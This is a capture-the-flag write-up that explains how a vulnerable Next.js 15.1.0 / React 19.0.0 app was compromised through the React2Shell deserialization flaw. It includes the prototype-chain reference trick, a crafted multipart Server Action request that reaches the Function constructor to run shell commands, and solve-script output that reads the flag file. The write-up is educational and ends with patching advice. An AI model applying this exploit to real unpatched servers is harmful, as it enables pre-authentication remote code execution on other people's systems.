# Dow is Up 50k — Writeup

- **Category:** Web
- **Points:** 10
- **Flag:** `rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}`
- **Description:** *SHOP NOW, PAY later, DASH home, cry in the BOX.*
- **Hint:** *When did you say you made this website?*
- **Target:** `http://18.215.143.250:3000` (Mirror 2: `http://18.145.136.91:3000`)

## TL;DR

"StockWatch" is a **Next.js 15.1.0 / React 19.0.0** app. That build predates the
patch for **React2Shell** — **CVE-2025-55182** (React) / **CVE-2025-66478**
(Next.js), a pre-auth RCE in the React Flight deserializer behind Server Actions.
A crafted multipart server-action request walks a prototype reference chain to
the `Function` constructor and runs shell commands **during deserialization**,
before any action id is validated. We read `/flag.txt` as the `nextjs` user.
The hint points at the version: the app is the vulnerable December-2024 Next.js
release, and "cry in the BOX" is the shell in the container.

## Recon

Fingerprinting the response headers shows Next.js with aggressive ISR caching:

```http
X-Powered-By: Next.js
x-nextjs-cache: HIT
x-nextjs-prerender: 1
Cache-Control: s-maxage=31536000,
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
```

The app is a stock dashboard. Every page shows a real snapshot from
**Dec 15, 2024** (Dow 43,828), while the footer claims *"Built Dec 2, 2025"*.
That contradiction is the hint — *when did you say you made this website?* The
version strings grepped from the client bundles settle it:

```
# in /_next/static/chunks/*.js
next ... 15.1.0
react ... 19.0.0
```

Next.js **15.1.0** shipped in December 2024. It is in the affected range for
React2Shell (fixed in **15.1.9**). "Dow is Up 50k" is just flavor — the Dow first
closed above 50,000 on Feb 6, 2026.

The only interactive server surface is three **React Server Actions** (stock
search, price alerts, watchlist), invoked by POSTing to `/` with a
`Next-Action:` header. A malformed action body returns the Flight error form,
confirming the deserializer path is live:

```
0:{"a":"$@1","f":"","b":"qyfJNY9j0_iFz3SifWy5m"}
1:E{"digest":"3352260594"}
```

> Dead ends worth noting (all ruled out): no middleware, so CVE-2025-29927 does
> nothing; the ISR cache cannot be busted with `x-now-route-matches` /
> prefetch / draft-mode headers (App Router, not the CVE-2024-46982 path); no
> source maps, no `/_next/image` SSRF, no exposed files, no symbol/search
> injection. The data is a frozen Dec-2024 snapshot, so there is no "50k render"
> to coax out. The solve is RCE, not a cache trick.

## The vulnerability (React2Shell)

React's Flight protocol serializes Server-Action arguments as numbered "chunks"
that can reference each other, e.g. `"$1:fruitName"` means *key `fruitName` of
chunk 1*. Before the fix, reference resolution did **not** check that the key was
an own-property of the object. So a chain can climb the prototype:

```python
# resolves to [Function: Function]
files = {
    "0": (None, '["$1:__proto__:constructor:constructor"]'),
    "1": (None, '{"x":1}'),
}
```

From there the exploit (credit **maple3142**) turns a reachable `Function`
constructor into a call gadget:

1. `"$@0"` returns the **raw `Chunk` object** for chunk 0 (not its resolved
   value). We overwrite chunk 0's own `.then` with `Chunk.prototype.then`:
   `{"then":"$1:__proto__:then"}` with `1 = "$@0"`. Next.js `await`s the decoded
   result, which calls our stolen `then`.
2. With `status: "resolved_model"`, that re-enters `initializeModelChunk`, giving
   a second parse pass where we control the chunk's `_response`.
3. The `"$B..."` (blob) handler does `response._formData.get(response._prefix + "0")`.
   We point `_formData.get` at the `Function` constructor and `_prefix` at our JS,
   so it becomes `Function("<our code>")("0")` — arbitrary code execution.

Because all of this happens inside deserialization, the action id is never
checked. `Next-Action: x` is enough to fire it.

## Exploit

The crafted request (command output comes back in the `digest`):

```http
POST / HTTP/1.1
Next-Action: x
Content-Type: multipart/form-data; boundary=...

--...
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,
 "value":"{\"then\": \"$B0\"}",
 "_response":{"_prefix":"<JS: execSync(cmd) -> throw Error with digest=output>",
              "_formData":{"get":"$1:constructor:constructor"}}}
--...
Content-Disposition: form-data; name="1"

"$@0"
--...--
```

Running it (see [`solves/dow-is-up-50k/solve.py`](../solves/dow-is-up-50k/solve.py)):

```
[*] 1. confirm RCE (id):
    uid=1001(nextjs) gid=65533(nogroup) groups=65533(nogroup)
[*] 2. locate the flag (ls -la /):
    ... -r--r--r-- 1 root root 47 Oct  5 02:44 flag.txt ...
[*] 3. read the flag:
    rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}
```

> Gotcha: Node's `execSync` throws on a non-zero exit, and the thrown error
> replaces our output with a numeric digest. End every command with `; true`
> (the script does this) so the real output is returned.

## Flag

```
rstcon{pr0t0typ3_p0llut10n_m3ets_r34ct_fl1ght}
```

## Takeaway

**Patch.** The real fix is upstream in React (`requireModule` / reference
resolution now verify own-property access); on Next.js that means **15.1.9+**
(or 15.0.5 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7, per the advisory).
There is no safe configuration workaround — any app serving React Server
Components / Server Actions on an affected version is pre-auth RCE-able, so
dependency-pin discipline and prompt upgrades are the defense. The flag name says
it: prototype pollution meets React Flight.
